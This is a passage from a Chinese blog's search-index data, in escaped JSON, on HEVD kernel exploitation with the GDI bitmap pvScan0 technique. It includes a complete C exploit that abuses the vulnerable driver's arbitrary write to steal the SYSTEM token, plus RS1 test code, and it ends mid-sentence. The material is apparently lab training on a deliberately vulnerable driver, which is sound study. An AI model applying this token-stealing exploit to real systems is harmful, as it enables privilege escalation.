\u8bf4\u767d\u4e86\u5176\u5b9e\u5c31\u662f\u521b\u5efa\u4e86\u4e24\u4e2a\u7ed3\u6784\uff0c\u4e00\u4e2a\u53eb BASEOBJECT\uff0c\u6bcf\u4e00\u4e2a GDI \u5bf9\u8c61\u90fd\u6709\u7684\u4e00\u4e2a\u5934\u90e8\u3002\u53e6\u4e00\u4e2a\u53eb SURFOBJ\uff0c\u4fdd\u5b58\u4e86\u5305\u62ec\u6211\u4eec\u53c2\u6570\u4fe1\u606f\u7684\u5b9e\u9645\u7ed3\u6784\u3002 \u6211\u4eec\u5148\u770b\u770b BASEOBJECT \u8fd9\u4e2a\u5bf9\u8c61\u5728\u8fd9\u91cc\u5176\u5b9e\u6ca1\u4ec0\u4e48\u7528\uff0c\u6211\u4eec\u53ea\u8981\u8bb0\u4f4f\u5b83\u7684\u504f\u79fb\u5c31\u597d\u4e86 x86 : 0x10 x64 : 0x18 \u518d\u6765\u770b\u770b SURFOBJ \u5176\u5b83\u53c2\u6570\u90fd\u4e0d\u91cd\u8981\uff0c\u6211\u4eec\u770b\u5230 pvScan0 \u7ed3\u5408\u4e0a\u9762\u90a3\u5f20\u56fe\uff0cpvScan0 \u6307\u5411\u4e00\u5757 Pixel Data \u6570\u636e\u533a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 GetBitmapBits \u548c SetBitmapBits \u6765\u63a7\u5236\u90a3\u5757\u6570\u636e\u533a\u3002 GetbitmapBits: SetbitmapBits:","title":"0x01 bitmap \u662f\u4ec0\u4e48"},{"location":"HEVD/bitmap/#0x02-bitmap","text":"\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5e94\u8be5\u5df2\u7ecf\u5927\u81f4\u6e05\u695a\u4e86 CreateBitmap \u6240\u521b\u5efa\u7684\u5185\u6838\u5bf9\u8c61\u5927\u81f4\u662f\u4e00\u4e2a\u4ec0\u4e48\u6837\u7684\u7ed3\u6784\u4e86\uff0c\u90a3\u4e48\uff0c\u8fd9\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u6211\u4eec\u6240\u8bf4\u7684\u4f5c\u7528\u5f53\u7136\u4e0d\u662f\u5b83\u672c\u6765\u4e0e gdi \u76f8\u5173\u7684\u4f5c\u7528\uff0c\u800c\u662f\u5bf9\u6211\u4eec\u7684\u6f0f\u6d1e\u5229\u7528\u6709\u4ec0\u4e48\u5e2e\u52a9\u5462\uff1f \u4e0a\u9762\u8bf4\u5230\uff0cpvScan0 \u6307\u5411\u4e00\u5757 Pixel Data \u6570\u636e\u533a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 GetBitmapBits \u548c SetBitmapBits \u6765\u63a7\u5236\u90a3\u5757\u6570\u636e\u533a\u3002\u4e0d\u8fc7\uff0c\u6ce8\u610f\u5230 SURFOBJ \u662f\u4e00\u4e2a\u5904\u4e8e\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e0b\u7684\u5bf9\u8c61\uff0cpvScan0 \u6240\u6307\u5411\u7684 Pixel Data \u6570\u636e\u533a\u4e5f\u662f\u4f4d\u4e8e\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e0b\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u901a\u8fc7 GetBitmapBits \u548c SetBitmapBits \u6765\u63a7\u5236\u5185\u6838\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u6570\u636e\u4e86\uff0c\u53ea\u8981\u6211\u4eec\u6709\u529e\u6cd5\u63a7\u5236 pvScan0 \u7684\u503c\uff0c\u8fd9\u4e0d\u5c31\u662f\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u6f0f\u6d1e\u5417\uff1f \u90a3\u4e48\u6211\u4eec\u8be5\u600e\u4e48\u63a7\u5236 pvScan0 \u7684\u503c\u5462\uff1f\u5176\u5b9e pvScan0 \u548c CreateBitmap \u7684\u7b2c\u4e94\u4e2a\u53c2\u6570\u662f\u76f8\u5bf9\u5e94\u7684\uff0c\u6211\u4eec\u770b\u770b\u7b2c\u4e94\u4e2a\u53c2\u6570\u548c pvScan0 \u600e\u4e48\u8bf4 \u8fd9\u91cc\u6839\u636e\u6211\u7684\u8c03\u8bd5\u7ed3\u679c\uff0c\u5982\u679c\u6211\u4eec\u7ed9 CreateBitmap \u7684\u7b2c\u4e94\u4e2a\u53c2\u6570\u968f\u4fbf\u6307\u5b9a\u4e00\u4e2a\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u7684\u8bdd\uff0c\u6548\u679c\u7c7b\u4f3c\u8fd9\u6837\u7684\u4ee3\u7801 HBITMAP hManager = CreateBitmap(0x20, 0x20, 0x1, 0x8, (PDWORD32)WorkerpvScan0Address); \u90a3\u4e48 hManager \u4f1a\u76f4\u63a5\u4e3a NULL,\u4e5f\u5c31\u662f\u8bf4\u521b\u5efa\u5931\u8d25\u4e86\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u6211\u4eec\u6ca1\u529e\u6cd5\u968f\u610f\u63a7\u5236 pvScan0 \u7684\u503c\uff0c\u9876\u591a\u53ea\u80fd\u8ba9 pvScan0 \u6307\u5411\u4e00\u5757\u6709\u610f\u4e49\u7684\u533a\u57df\u3002 \u6240\u4ee5\u6211\u4eec\u5176\u5b9e\u662f\u9700\u8981\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u6765\u63a7\u5236 pvScan0 \u7684\u503c\u7684\uff08\u63a7\u5236 pvScan0 \u7684\u503c\u4e4b\u540e\u6211\u4eec\u8fd8\u80fd\u83b7\u5f97\u4efb\u610f\u5730\u5740\u8bfb\u6743\u9650\uff09 \u603b\u7ed3\u4e00\u4e0b\uff0c\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u80fd\u901a\u8fc7 bitmap \u6765\u83b7\u5f97\u4efb\u610f\u5730\u5740\u8bfb\u5199\u6743\u9650\uff0c\u8fd9\u5c31\u662f bitmap \u7684\u4f5c\u7528","title":"0x02 bitmap \u7684\u4f5c\u7528"},{"location":"HEVD/bitmap/#0x03-bitmap","text":"\u90a3\u4e48\uff0c\u5047\u82e5\u6211\u4eec\u6709\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u7684\u8bdd\uff0c\u6211\u4eec\u8be5\u5f80\u54ea\u91cc\u5199\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684\u533a\u57df\u7684\u5730\u5740\u5462\uff1f\u6362\u53e5\u8bdd\u8bf4\uff0c\u600e\u4e48\u83b7\u5f97 pvScan0 \u7684\u5730\u5740\uff1f \u9996\u5148\uff0c\u6211\u4eec\u77e5\u9053 fs \u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u6307\u5411 teb\uff0c\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u6307\u5411 pcr\uff0c\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 NtCurrentTeb \u6765\u83b7\u5f97 teb \u7684\u57fa\u5740\u3002teb \u4e2d\u7684 ProcessEnvironmentBlock \u6307\u5411\u7ebf\u7a0b\u6240\u5728\u7684\u8fdb\u7a0b peb\u3002peb \u504f\u79fb 0x094 \u7684\u5730\u65b9\uff08x86\u4e0b\uff09\u662f\u4e00\u4e2a\u6307\u5411 GDICELL \u7ed3\u6784\u4f53\u6570\u7ec4\u7684\u6307\u9488 GdiSharedHandleTableAddr \u901a\u8fc7 CreateBitmap \u8fd4\u56de\u7684 handle \u503c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8be5 bitmap \u7684 GDICELL \u7ed3\u6784\u4f53\u7684\u7d22\u5f15\uff0c\u8ba1\u7b97\u65b9\u6cd5\u4e3a DWORD32 pKernelAddress = GdiSharedHandleTableAddr + (( DWORD32 ) handle 0xffff ) * ( x86 : 0x10 , x64 : 0x18 ); \u6ca1\u9519\uff0c\u901a\u8fc7 GdiSharedHandleTableAddr \u6307\u9488\u6211\u4eec\u5c31\u80fd\u627e\u5230 pvScan0 \u7684\u5730\u5740\uff0c\u4f46\u662f\u5728 windows 10 1607 \u53ca\u5176\u4ee5\u540e\u7684\u7248\u672c\uff0cGdiSharedHandleTableAddr \u6307\u9488\u6307\u5411\u7684\u533a\u57df\u53d8\u4e3a\u4e86 ????\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a\u672a\u5206\u914d\u7684\u533a\u57df\uff0c\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u8fd9\u4e2a\u5229\u7528\u65b9\u6cd5\u88ab\u6253\u4e0a\u4e86\u8865\u4e01\uff0c\u56e0\u4e3a\u6211\u4eec\u6ca1\u6cd5\u5f97\u5230 pvScan0 \u7684\u5730\u5740\u4e86\u3002 \u56de\u5230\u539f\u6587\uff0cGDICELL \u7ed3\u6784\u4f53\u7684\u7ed3\u6784\u4e3a /// 32bit size: 0x10 /// 64bit size: 0x18 typedef struct _GDI_CELL { IntPtr pKernelAddress ; UInt16 wProcessId ; UInt16 wCount ; UInt16 wUpper ; UInt16 wType ; IntPtr pUserAddress ; } \u5176\u7b2c\u4e00\u4e2a\u6307\u9488 pKernelAddress \u6307\u5411\u4e86 BASEOBJECT \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u4e5f\u5c31\u662f\u8bf4 *(PDWORD32)pKernelAddress + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38) \u6b63\u662f pvScan0 \u7684\u5730\u5740","title":"0x03 \u5982\u4f55\u4f7f\u7528 bitmap"},{"location":"HEVD/bitmap/#0x04-bitmap","text":"\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u5176\u5b9e bitmap \u7684\u5229\u7528\u5df2\u7ecf\u5f88\u6e05\u6670\u4e86 \u8c03\u7528 CreateBitmap \u521b\u5efa bitmap \u5185\u6838\u5bf9\u8c61 \u901a\u8fc7 teb \u83b7\u5f97 pvScan0 \u7684\u5730\u5740 \u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u6539\u5199 pvScan0 \u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u8bfb\u7684\u5730\u5740 \u8c03\u7528 GetBitmapBits \u6765\u8bfb\u53d6\u6570\u636e \u63a5\u4e0b\u6765\u5c31\u4ee5\u7b2c\u4e8c\u7bc7\u6587\u7ae0\u7684\u6f0f\u6d1e\u6765\u63d0\u6743\u9a8c\u8bc1\u4e00\u4e0b bitmap \u7684\u4f7f\u7528 \u5728\u5f00\u59cb\u4e4b\u524d\uff0c\u5148\u770b\u4e00\u4e0b\u8fd9\u5f20\u56fe \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u4e24\u4e2a bitmap\uff0c\u4e00\u4e2a\u7528\u6765\u63a7\u5236\u6211\u4eec\u8981\u8bfb\u5199\u7684\u5730\u5740\uff0c\u4e00\u4e2a\u7528\u6765\u5b9e\u9645\u5bf9\u90a3\u5757\u5730\u5740\u8fdb\u884c\u8bfb\u5199\uff0c\u8fd9\u6837\u5b50\u64cd\u4f5c\u8d77\u6765\u4f1a\u8212\u670d\u5f88\u591a\uff0c\u5199\u8d77\u4ee3\u7801\u6765\u4e5f\u66f4\u6e05\u6670\u7b80\u6d01\u3002 \u7531\u4e8e\u6211\u4eec\u4e4b\u540e\u4e0d\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u6267\u884c\u6211\u4eec\u7684 shellcode\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u6a21\u62df\u8fd9\u4e2a\u8fc7\u7a0b\uff08\u6211\u4eec\u53ef\u4ee5\u5bf9\u4efb\u610f\u5730\u5740\u8fdb\u884c\u8bfb\u5199\uff09 \u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5e94\u8be5\u8981\u505a\u7684\u4e8b \u521b\u5efa\u4e24\u4e2a bitmap\uff0c\u5206\u522b\u4e3a hManager \u548c hWorker \u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u6539\u5199 hManager \u7684 pvScan0 \u7684\u503c\u4e3a hWorker \u7684 pvScan0 \u7684\u5730\u5740 \u7ed3\u5408 GetBitmapBits \u548c SetBitmapBits\uff0c\u5229\u7528 hManager \u548c hWorker \u8bfb\u53d6 system \u7684 token \u628a system \u7684 token \u8d4b\u4e88\u6211\u4eec\u7684\u5f53\u524d\u8fdb\u7a0b \u9a8c\u8bc1\u63d0\u6743 \u8fd9\u91cc\u8865\u5145\u4e00\u4e0b\u4e24\u4e2a\u5c0f\u77e5\u8bc6 \u7b2c\u4e00\u4e2a\u662f ntoskrnl.exe \u4e2d\u6709\u4e2a\u53eb PsInitialSystemProcess \u7684\u5168\u5c40\u53d8\u91cf\uff08\u6307\u9488\uff09\uff0c\u5176\u6307\u5411 system \u8fdb\u7a0b\u7684 eprocess \u7b2c\u4e8c\u4e2a\u662f\u5185\u6838\u5728\u4e0d\u540c\u7684\u73af\u5883\u4e0b\u6709\u4e0d\u540c\u7684\u540d\u5b57 \u5230\u73b0\u5728\u5e94\u8be5\u628a\u6bcf\u4e00\u4e2a\u70b9\u90fd\u8bf4\u6e05\u695a\u4e86\uff0c\u63a5\u4e0b\u6765\u8d34\u51fa\u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u7684 bitmap \u5229\u7528\u65b9\u6cd5 \uff08\u4e4b\u524d\u662f\u6539\u5199 [HalDispatchTable+0x4] \u6765\u6267\u884c shellcode\uff09 #include stdafx.h #include windows.h #include Psapi.h TCHAR driverName [ 1024 ]; typedef struct _payload { PULONG_PTR what ; PULONG_PTR where ; } Payload , * PPayload ; VOID readOOB ( HBITMAP hManager , HBITMAP hWorker , DWORD32 whereWrite , LPVOID whatWrite , int len ) { SetBitmapBits ( hManager , len , whereWrite ); // set \u5199\u7684\u662f hWorker \u7684 pvScan0 \u7684\u503c // \u901a\u8fc7\u63a7\u5236 hWorker \u7684 pvScan0 \u7684\u503c\u6765\u51b3\u5b9a\u5bf9\u54ea\u5757\u5730\u5740\u8fdb\u884c\u8bfb\u5199 GetBitmapBits ( hWorker , len , whatWrite ); } VOID writeOOB ( HBITMAP hManager , HBITMAP hWorker , DWORD32 whereWrite , LPVOID whatWrite , int len ) { SetBitmapBits ( hManager , len , whereWrite ); SetBitmapBits ( hWorker , len , whatWrite ); } DWORD32 getpvScan0Address ( HBITMAP handle ) { printf ( handle value: 0x%p \\n ,( DWORD32 ) handle ); DWORD32 tebAddr = ( DWORD32 ) NtCurrentTeb (); printf ( tebAddr: 0x%p \\n , tebAddr ); DWORD32 pebAddr = * ( PDWORD32 )(( PUCHAR ) tebAddr + 0x30 ); printf ( pebAddr: 0x%p \\n , pebAddr ); DWORD32 GdiSharedHandleTableAddr = * ( PDWORD32 )(( PUCHAR ) pebAddr + 0x94 ); printf ( GdiSharedHandleTableAddr: 0x%p \\n , GdiSharedHandleTableAddr ); // GdiSharedHandleTableAddr \u662f\u4e00\u4e2a\u6307\u5411GDICELL\u7ed3\u6784\u4f53\u6570\u7ec4\u7684\u6307\u9488 // GDICELL \u7ed3\u6784\u4f53 x86 0x10,x64 0x18 DWORD32 pKernelAddress = GdiSharedHandleTableAddr + (( DWORD32 ) handle 0xffff ) * 0x10 ; printf ( pKernelAddress: 0x%p \\n , pKernelAddress ); DWORD32 surfaceObject = * ( PDWORD32 ) pKernelAddress ; printf ( surfaceObject address: 0x%p \\n , surfaceObject ); // BASEOBJECT \u7ed3\u6784\u4f53 x86 0x10,x64 0x18 // pvScan0 \u5728 SURFOBJ \u7ed3\u6784\u4f53\u4e2d\u7684\u504f\u79fb x86 0x20,x64 0x38 DWORD32 pvScan0Address = surfaceObject + 0x10 + 0x20 ; printf ( pvScan0 address: 0x%p \\n , pvScan0Address ); return pvScan0Address ; } DWORD32 getKernelBase () { PVOID driversAddress [ 1024 ]; DWORD cbNeeded ; int cDrivers , i ; int ntoskrnlKernelBase ; // find ntoskrnl.exe kernel base if ( EnumDeviceDrivers ( driversAddress , sizeof ( driversAddress ), cbNeeded ) cbNeeded sizeof ( driversAddress )) { cDrivers = cbNeeded / sizeof ( driversAddress [ 0 ]); for ( i = 0 ; i cDrivers ; i ++ ) { if ( GetDeviceDriverBaseName ( driversAddress [ i ], driverName , 1024 )) { char * lowerName = _strlwr ( driverName ); if ( ! strncmp ( driverName , nt , 2 )) { ntoskrnlKernelBase = i ; break ; } else { if ( i == ( cDrivers - 1 )) { printf ( can t find driver name \\n ); exit ( 0 ); } continue ; } } else { printf ( get device driver name failed \\n ); } } } else { printf ( Enumerate Device Drivers failed \\n ); return 0 ; } printf ( driver name is: %s \\n , driverName ); return ( DWORD32 ) driversAddress [ ntoskrnlKernelBase ]; } DWORD32 getSystemEProcessAddr () { DWORD32 ntoskrnlKernelBase = getKernelBase (); DWORD32 ntoskrnlUserBase = ( DWORD32 ) LoadLibrary ( driverName ); if ( ntoskrnlUserBase == NULL ) { printf ( load library failed! \\n ); return 0 ; } DWORD32 PsInitialSystemProcessUserSpaceAddr = ( DWORD32 ) GetProcAddress (( HMODULE ) ntoskrnlUserBase , PsInitialSystemProcess ); DWORD32 PsInitialSystemProcessKernelSpaceAddr = ntoskrnlKernelBase + ( PsInitialSystemProcessUserSpaceAddr - ntoskrnlUserBase ); return PsInitialSystemProcessKernelSpaceAddr ; } int main () { HBITMAP hManager = CreateBitmap ( 0x20 , 0x20 , 0x1 , 0x8 , NULL ); if ( hManager == NULL ) { printf ( create manager bitmap failed \\n ); return 0 ; } HBITMAP hWorker = CreateBitmap ( 0x20 , 0x20 , 0x1 , 0x8 , NULL ); if ( hWorker == NULL ) { printf ( create worker bitmap failed \\n ); return 0 ; } printf ( Manager bitmap: \\n ); DWORD32 ManagerpvScan0Address = getpvScan0Address ( hManager ); printf ( Worker bitmap: \\n ); DWORD32 WorkerpvScan0Address = getpvScan0Address ( hWorker ); PPayload payload = NULL ; // malloc payload = ( PPayload ) HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY , sizeof ( Payload )); payload - what = ( PULONG_PTR ) WorkerpvScan0Address ; payload - where = ( PULONG_PTR ) ManagerpvScan0Address ; DWORD BytesReturned = 0 ; HANDLE hDevice = CreateFileA ( \\\\\\\\ . \\\\ HackSysExtremeVulnerableDriver , 0xC0000000 , 0 , NULL , 0x3 , 0 , NULL ); DeviceIoControl ( hDevice , 0x0022200B , ( LPVOID ) payload , sizeof ( Payload ), NULL , 0 , BytesReturned , NULL ); // \u5df2\u7ecf overwrite \u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5229\u7528 SetBitmapBits \u548c GetBitmapBits \u6765\u8bfb\u5199 DWORD32 systemEprocessAddr = 0 ; LPVOID lpSystemToken = NULL ; // \u83b7\u53d6 system \u8fdb\u7a0b\u7684 token readOOB ( hManager , hWorker , getSystemEProcessAddr (), systemEprocessAddr , sizeof ( DWORD32 )); readOOB ( hManager , hWorker , ( systemEprocessAddr + 0x0f8 ), lpSystemToken , sizeof ( DWORD32 )); // _eprocess + 0x0f8 \u662f token // _eprocess + 0x0B8 \u662f ActiveProcessLinks.Flink // _eprocess + 0x0b4 \u662f processid // \u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684 _eprocess DWORD32 lpNextEPROCESS = 0 ; LPVOID lpCurrentPID = NULL ; DWORD32 dwCurrentPID ; LIST_ENTRY lpNextEntryAddreess = { 0 }; DWORD32 currentProcessID = GetCurrentProcessId (); // \u901a\u8fc7PID\u5224\u65ad\u662f\u5426\u83b7\u53d6\u5230\u5f53\u524d\u8fdb\u7a0b\u7684\u5730\u5740 readOOB ( hManager , hWorker , systemEprocessAddr + 0x0B8 , lpNextEntryAddreess , sizeof ( LIST_ENTRY )); do // \u6839\u636ePID\u662f\u5426\u627e\u5230\u5f53\u524d\u8fdb\u7a0b { // \u83b7\u53d6\u4e0b\u4e00\u4e2a\u8fdb\u7a0b lpNextEPROCESS = ( DWORD32 )(( PUCHAR ) lpNextEntryAddreess . Flink - 0x0B8 ); // \u83b7\u53d6PID readOOB ( hManager , hWorker , lpNextEPROCESS + 0x0b4 , lpCurrentPID , sizeof ( LPVOID )); dwCurrentPID = LOWORD ( lpCurrentPID ); readOOB ( hManager , hWorker , lpNextEPROCESS + 0x0B8 , lpNextEntryAddreess , sizeof ( LIST_ENTRY )); } while ( dwCurrentPID != currentProcessID ); DWORD32 currentTokenAddress = ( DWORD32 ) lpNextEPROCESS + 0x0f8 ; writeOOB ( hManager , hWorker , currentTokenAddress , lpSystemToken , sizeof ( LPVOID )); system ( whoami \\n ); }","title":"0x04 bitmap \u4efb\u610f\u5730\u5740\u5199\u6f0f\u6d1e\u5229\u7528"},{"location":"HEVD/bitmap/#0x05","text":"\u4e0a\u6587\u4e2d\u63d0\u5230\u8fc7\uff0cbitmap \u7684\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u4ece RS1 \u5f00\u59cb\u5c31\u5931\u53bb\u4f5c\u7528\u4e86\u3002\u7136\u800c\uff0c\u5931\u53bb\u4f5c\u7528\u540e\u53c8\u4ea7\u751f\u4e86 bitmap \u7684\u66ff\u4ee3\u65b9\u6cd5\uff0c\u63a5\u4e0b\u6765\u6253\u7b97\u5b66\u4e60\u4e00\u4e0b\u8fd9\u4e2a\u66ff\u4ee3\u65b9\u6cd5\u7684\u9012\u8fdb\u8fc7\u7a0b\uff08RS1 \u4e0b\u6709\u65b0\u7684\u5229\u7528\u65b9\u6cd5\uff0cRS2 \u4e0b\u53c8\u5931\u6548\u4e86\uff0cRS2 \u4e0b\u53c8\u53ef\u4ee5\u7528\u65b0\u7684\u65b9\u6cd5 ...\uff09 2019.9.11","title":"0x05 \u7ed3\u675f\u8bed"},{"location":"HEVD/bitmapReplace_RS1/","text":"\u8f6c\u8f7d\u8bf7\u6ce8\u660e\u51fa\u5904\u54e6 : ) 0x00 \u524d\u8a00 \u54c8\u55bd\uff0c\u5931\u8e2a\u4eba\u53e3\u56de\u5f52\u4e86\uff0c\u867d\u7136\u4e5f\u6ca1\u4eba\u770b \uff1a ) \u597d\u4e45\u6ca1\u5b66\u4e60\u4e86 \u4e4b\u524d\u4e00\u6bb5\u65f6\u95f4\u6709\u4e9b\u6bd4\u8f83\u91cd\u8981\u7684\u4e8b\u60c5\uff0c\u73b0\u5728\u544a\u4e00\u6bb5\u843d\u4e86 \u5e9f\u8bdd\u4e0d\u591a\u8bf4\uff0c\u56de\u5f52\u6b63\u9898 0x01 RS1 \u60c5\u51b5\u5206\u6790 \u4e0a\u4e00\u7bc7\u6587\u7ae0\u4e5f\u6709\u63d0\u5230\u8fc7\uff0c\u901a\u8fc7 GdiSharedHandleTable \u6765\u83b7\u53d6 pvScan0 \u7684\u5730\u5740\u7684\u5229\u7528\u65b9\u5f0f\u5728 RS1 \u53ca\u4ee5\u540e\u7684\u7248\u672c\u5df2\u7ecf\u884c\u4e0d\u901a\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u6bb5\u5c0f\u4ee3\u7801\u5728 RS1 \u4e0b\u7684\u8fd0\u884c\u60c5\u51b5 // test.cpp : Defines the entry point for the console application. // #include stdafx.h #include windows.h DWORD64 getpvScan0Address ( HBITMAP handle ) { printf ( handle value: 0x%p \\n , ( DWORD64 ) handle ); DWORD64 tebAddr = ( DWORD64 ) NtCurrentTeb (); printf ( tebAddr: 0x%p \\n , tebAddr ); DWORD64 pebAddr = * ( PDWORD64 )(( PUCHAR ) tebAddr + 0x60 ); printf ( pebAddr: 0x%p \\n , pebAddr ); DWORD64 GdiSharedHandleTableAddr = * ( PDWORD64 )(( PUCHAR ) pebAddr + 0x0f8 ); printf ( GdiSharedHandleTableAddr: 0x%p \\n , GdiSharedHandleTableAddr ); // GdiSharedHandleTableAddr \u662f\u4e00\u4e2a\u6307\u5411GDICELL\u7ed3\u6784\u4f53\u6570\u7ec4\u7684\u6307\u9488 // GDICELL \u7ed3\u6784\u4f53 x86 0x10,x64 0x18 DWORD64 pKernelAddress = GdiSharedHandleTableAddr + (( DWORD64 ) handle 0xffff ) * 0x18 ; printf ( pKernelAddress: 0x%p \\n , pKernelAddress ); DebugBreak (); DWORD64 surfaceObject = * ( PDWORD64 ) pKernelAddress ; printf ( surfaceObject address: 0x%p \\n , surfaceObject ); // BASEOBJECT \u7ed3\u6784\u4f53 x86 0x10,x64 0x18 // pvScan0 \u5728 SURFOBJ \u7ed3\u6784\u4f53\u4e2d\u7684\u504f\u79fb x86 0x20,x64 0x38 DWORD64 pvScan0Address = surfaceObject + 0x18 + 0x38 ; printf ( pvScan0 address: 0x%p \\n , pvScan0Address ); DebugBreak (); return pvScan0Address ; } int main () { HBITMAP hBitmap = CreateBitmap ( 0x10 , 0x1 , 0x1 , 0x8 , NULL ); if ( hBitmap == NULL ) { printf ( create bitmap failed \\n ); exit ( 0 ); } getpvScan0Address ( hBitmap ); return 0 ; } \u6211\u4eec\u5148\u770b\u4e00\u4e0b\u5728\u7b2c\u4e00\u4e2a DebugBreak \u65f6\u7684\u5185\u5b58\u60c5\u51b5 \u9898\u5916\u8bdd\uff0c\u8fd9\u91cc\u7684 dq 0x000001cb`da71b640 \u547d\u4ee4\u7684\u7ed3\u679c\u53ef\u80fd\u663e\u793a ????????\uff0c\u770b\u8d77\u6765\u50cf\u662f\u4e00\u5757\u672a\u5206\u914d\u7684\u4e0d\u53ef\u8bfb\u5199\u7684\u5730\u5740\uff0c\u4f46\u4f60\u4f1a\u53d1\u73b0\u5373\u4f7f\u8fd9\u8fb9\u663e\u793a\u7684\u662f ????????\uff0c\u540e\u9762\u7684\u4ee3\u7801\u4e5f\u53ef\u4ee5\u628a\u5730\u5740\u6cc4\u9732\u51fa\u6765\u3002\u6b63\u5e38\u6765\u8bf4\u5bf9\u4e00\u5757 ???????? \u7684\u5730\u5740\u8fdb\u884c\u7c7b\u4f3c DWORD64 surfaceObject = *(PDWORD64)pKernelAddress \u7684\u8bfb\u5199\u64cd\u4f5c\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5e94\u8be5\u4f1a\u5d29\u6e83\u624d\u662f\u3002\u6240\u4ee5\u4e2a\u4eba\u611f\u89c9\u5e94\u8be5\u662f windbg \u7684\u663e\u793a\u95ee\u9898\uff0c\u8fd9\u5757\u5730\u5740\u5e94\u8be5\u662f\u50cf\u56fe\u4e2d\u8fd9\u6837\u6709\u6570\u636e\u7684\u624d\u662f\u3002 \u56de\u5f52\u6b63\u9898\uff0c*(PDWORD64)pKernelAddress \u672c\u6765\u5e94\u8be5\u6307\u5411 surfaceObject\uff0c\u5373\u6211\u4eec\u521b\u5efa\u7684 bitmap GDI \u5bf9\u8c61\u5728\u6362\u9875\u4f1a\u8bdd\u6c60\u4e2d\u7684\u4f4d\u7f6e\uff0c\u4f46\u662f\u770b\u5230\u56fe\u4e2d\uff0c\u4f60\u6709\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e2a\u5730\u5740\u5f02\u5e38\u9ad8\uff1f\u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u4e2a\u5730\u5740\u7684\u5185\u5b58\u60c5\u51b5 \u6ca1\u9519\uff0c\u539f\u672c\u5e94\u8be5\u6307\u5411 surfaceObject \u7684 *(PDWORD64)pKernelAddress \u6307\u5411\u4e86\u4e00\u5757\u65e0\u610f\u4e49\u7684\u5730\u5740\u3002\u56e0\u6b64 *(PDWORD64)pKernelAddress + 0x18 + 0x38 \u4e5f\u4e0d\u662f\u6211\u4eec\u6240\u8981\u7684 pvScan0 \u7684\u5730\u5740\u4e86\uff0c\u8fd9\u5c31\u662f\u5fae\u8f6f\u5728 RS1 \u4e0b\u5bf9 bitmap \u7684\u5229\u7528\u6240\u8fdb\u884c\u7684\u7f13\u89e3\u63aa\u65bd\u3002 (\u5176\u5b9e\u6211\u603b\u89c9\u5f97\u8fd9\u4e2a *(PDWORD64)pKernelAddress \u662f\u6709\u610f\u4e49\u7684\uff0c\u867d\u7136\u5b83\u4e0d\u76f4\u63a5\u7b49\u4e8e surfaceObject \u7684\u5730\u5740\u4e86\uff0c\u4f46\u662f\u6211\u731c\u6d4b\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7\u67d0\u79cd\u53d8\u6362\u6765\u5f97\u5230 surfaceObject \u7684\u5730\u5740\uff0c\u6bd5\u7adf\u6bcf\u6b21\u8fd0\u884c *(PDWORD64)pKernelAddress \u7684\u503c\u90fd\u5728\u53d1\u751f\u53d8\u5316\uff0c\u800c\u4e14\u9ad8\u597d\u591a\u4f4d\u90fd\u662f\u4e0d\u53d8\u7684\uff0c\u770b\u8d77\u6765\u4e0d\u592a\u50cf\u662f\u65e0\u610f\u4e49\u5730\u8ba9 *(PDWORD64)pKernelAddress \u6307\u5411\u4e00\u5757\u65e0\u610f\u4e49\u7684\u5730\u5740\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u77e5\u9053\u600e\u4e48\u624d\u80fd\u77e5\u9053\u5fae\u8f6f\u5230\u5e95\u505a\u4e86\u4ec0\u4e48) 0x02 \u5229\u7528\u5176\u5b83\u5bf9\u8c61\u6765\u6cc4\u9732 bitmap GDI \u5bf9\u8c61\u7684\u5730\u5740 \u901a\u8fc7\u4e0a\u4e00\u5c0f\u8282\uff0c\u6211\u4eec\u77e5\u9053\u901a\u8fc7 GdiSharedHandleTable - pKernel - 